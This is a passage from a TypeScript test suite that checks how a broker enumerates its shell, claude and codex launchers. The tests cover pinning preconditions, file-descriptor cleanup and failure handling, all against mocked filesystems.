   * and headless needs a non-script entrypoint AND the boot-time python3 exec pin. Either missing and
   * the launcher is refused at create, so the enumeration must not name it.
   */
  it('drops the agent launchers when the headless preconditions do not hold', async () => {
    // A shebang claude: legal for the tty path, refused for every attempt the dashboard makes.
    const scriptedClaude = vmTree();
    scriptedClaude['/var/lib/kb-shell/home/.local/bin/claude'] = {
      kind: 'file', uid: 1000, gid: 1000, mode: 0o700, content: '#!/usr/bin/env node\nrequire("./cli.js");\n',
    };
    expect(await pinnableLauncher('claude', PIN_IDENTITIES, pinningFsOver(scriptedClaude))).toBe(false);
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(scriptedClaude)))
      .toEqual(['shell', 'codex']);

    // The boot-time pipe-stdin exec pin failed (no /usr/bin/python3): shell only, and honestly so.
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, pinningFsOver(vmTree()), false))
      .toEqual(['shell']);
    expect(await pinnableLauncher('shell', PIN_IDENTITIES, pinningFsOver(vmTree()), false)).toBe(true);
    for (const launcher of ['claude', 'codex'] as const) {
      expect(await pinnableLauncher(launcher, PIN_IDENTITIES, pinningFsOver(vmTree()), false), launcher)
        .toBe(false);
    }
  });

  it('closes every descriptor it opened, on the accepting path and the refusing one alike', async () => {
    // The walk pins a descriptor per path component and holds them so the launch cannot be swapped out
    // from under it. A probe throws them away instead of spawning, so a leak here is a descriptor leak in
    // the BROKER — the long-lived process — once per capability probe, forever.
    const accepting = pinningFsOver(vmTree());
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, accepting)).toEqual(['shell', 'claude', 'codex']);
    expect(accepting.openFds()).toBe(0);

    const refusing = withoutCodex(vmTree());
    refusing['/var/lib/kb-shell/home/.local/bin/claude'] = {
      kind: 'file', uid: 1000, gid: 1000, mode: 0o755, content: 'ELF',
    };
    const refused = pinningFsOver(refusing);
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, refused)).toEqual(['shell']);
    expect(refused.openFds()).toBe(0);
  });

  it('reports NOTHING when the enumeration itself throws — never a launcher, never a partial guess', async () => {
    const onFire = (): never => { throw new Error('the filesystem is on fire'); };
    const exploding: PinningFileSystem = {
      open: onFire, identity: onFire, identityAt: onFire,
      readlink: onFire, read: onFire, close: onFire,
    };
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, exploding)).toEqual([]);
    for (const launcher of ['shell', 'claude', 'codex'] as const) {
      expect(await pinnableLauncher(launcher, PIN_IDENTITIES, exploding), launcher).toBe(false);
    }

    // A single launcher whose walk explodes takes only itself out of the set.
    const healthy = pinningFsOver(vmTree());
    expect(await enumerateBrokerLaunchers(PIN_IDENTITIES, {
      ...healthy,
      open: (target: string, flags: number) => {
        if (target.endsWith('/codex')) throw new Error('EIO');
        return healthy.open(target, flags);
      },
    })).toEqual(['shell', 'claude']);
  });
});
